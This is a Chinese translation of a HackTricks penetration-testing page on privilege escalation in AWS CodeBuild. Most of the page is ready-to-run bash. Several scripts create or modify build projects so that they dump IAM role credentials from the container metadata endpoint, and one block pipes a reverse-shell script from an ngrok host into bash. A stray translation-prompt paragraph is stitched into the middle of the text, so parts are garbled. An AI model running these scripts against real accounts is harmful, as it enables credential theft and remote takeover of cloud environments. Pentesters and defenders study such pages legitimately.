# AWS - Codebuild特权升级

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## codebuild

### `iam:PassRole`, `codebuild:CreateProject`, (`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

具有**`iam:PassRole`, `codebuild:CreateProject`和`codebuild:StartBuild`或`codebuild:StartBuildBatch`**权限的攻击者可以通过创建一个正在运行的Codebuild IAM角色来升级特权。

{% tabs %}
{% tab title="示例1" %}
```bash
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

JSON="{
\"name\": \"codebuild-demo-project\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"aws/codebuild/standard:1.0\",
\"computeType\": \"BUILD_GENERAL1_SMALL\"
},
\"serviceRole\": \"arn:aws:iam::947247140022:role/service-role/codebuild-CI-Build-service-role-2\"
}"


REV_PATH="/tmp/rev.json"

printf "$JSON" > $REV_PATH

# Create project
aws codebuild create-project --cli-input-json file://$REV_PATH

# Build it
aws codebuild start-build --project-name codebuild-demo-project

# Wait 3-4 mins until it's executed
# Then you can access the logs in the console to find the AWS role token in the output

# Delete the project
aws codebuild delete-project --name codebuild-demo-project
```
以下是关于提权技术的黑客书籍的内容。以下内容来自文件pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc.md。将相关的英文文本翻译成中文，并返回翻译结果，保持完全相同的markdown和html语法。不要翻译代码、黑客技术名称、黑客术语、云/SaaS平台名称（如Workspace、aws、gcp...）、泄漏、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需提供翻译和markdown语法即可。
```bash
# Generated by AI, not tested
# Create a buildspec.yml file with reverse shell command
echo 'version: 0.2
phases:
build:
commands:
- curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash' > buildspec.yml

# Create a new CodeBuild project with the buildspec.yml file
aws codebuild create-project --name reverse-shell-project --source type=S3,location=<S3_BUCKET_NAME>/buildspec.yml --artifacts type=NO_ARTIFACTS --environment computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:5.0,type=LINUX_CONTAINER --service-role <YOUR_HIGH_PRIVILEGE_ROLE_ARN> --timeout-in-minutes 60

# Start a build with the new project
aws codebuild start-build --project-name reverse-shell-project

```
{% endcode %}
{% endtab %}
{% endtabs %}

**潜在影响：**直接提升到任何AWS Codebuild角色。

{% hint style="warning" %}
在**Codebuild容器**中，文件`/codebuild/output/tmp/env.sh`包含访问**元数据凭证**所需的所有环境变量。

该文件包含**环境变量`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`**，其中包含访问凭证的**URL路径**。它将类似于`/v2/credentials/2817702c-efcf-4485-9730-8e54303ec420`

将其添加到URL **`http://169.254.170.2/`**，您将能够转储角色凭证。

此外，它还包含**环境变量`ECS_CONTAINER_METADATA_URI`**，其中包含获取有关容器的**元数据信息的完整URL**。
{% endhint %}

### `iam:PassRole`，`codebuild:UpdateProject`，（`codebuild:StartBuild` | `codebuild:StartBuildBatch`）

就像在前一节中一样，如果您可以修改构建项目而不是创建它，您可以指定IAM角色并窃取令牌
```bash
REV_PATH="/tmp/codebuild_pwn.json"
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# You need to indicate the name of the project you want to modify
JSON="{
\"name\": \"<codebuild-demo-project>\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"aws/codebuild/standard:1.0\",
\"computeType\": \"BUILD_GENERAL1_SMALL\"
},
\"serviceRole\": \"arn:aws:iam::947247140022:role/service-role/codebuild-CI-Build-service-role-2\"
}"

printf "$JSON" > $REV_PATH

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build --project-name codebuild-demo-project
```
**潜在影响：**直接提升任何AWS Codebuild角色的权限。

### `codebuild:UpdateProject`，(`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

与前一节类似，但**没有`iam:PassRole`权限**，您可以滥用这些权限来**修改现有的Codebuild项目并访问它们已分配的角色**。
```bash
REV_PATH="/tmp/codebuild_pwn.json"
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

JSON="{
\"name\": \"<codebuild-demo-project>\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"docker.io/ubuntu/ubuntu:latest\",
\"computeType\": \"BUILD_GENERAL1_SMALL\",
\"imagePullCredentialsType\": \"CODEBUILD\"
}
}"

printf "$JSON" > $REV_PATH

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build --project-name codebuild-demo-project
```
**潜在影响：**直接提升到附加的AWS Codebuild角色。

### SSM

如果具有足够的权限启动ssm会话，则可以进入正在构建的Codebuild项目。

codebuild项目需要设置断点：

<pre class="language-yaml"><code class="lang-yaml">phases:
pre_build:
commands:
- echo 进入pre_build阶段...
- echo "Hello World" > /tmp/hello-world
<strong>      - codebuild-breakpoint
</strong></code></pre>

然后：
```bash
aws codebuild batch-get-builds --ids <buildID> --region <region> --output json
aws ssm start-session --target <sessionTarget> --region <region>
```
有关更多信息，请查看[**文档**](https://docs.aws.amazon.com/codebuild/latest/userguide/session-manager.html)。

**潜在影响：**直接提升附加的AWS Codebuild角色权限。

### S3构建规范文件

根据[**文档**](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html)，可以将CodeBuild项目的**构建规范文件**（运行时将执行的代码）存储在**S3**存储桶中。

因此，如果攻击者对该文件具有写访问权限，他可以**更改命令**以窃取CodeBuild项目的**IAM角色**的**凭据**并提升权限。

**潜在影响：**直接提升附加的AWS Codebuild角色权限。

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您希望在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
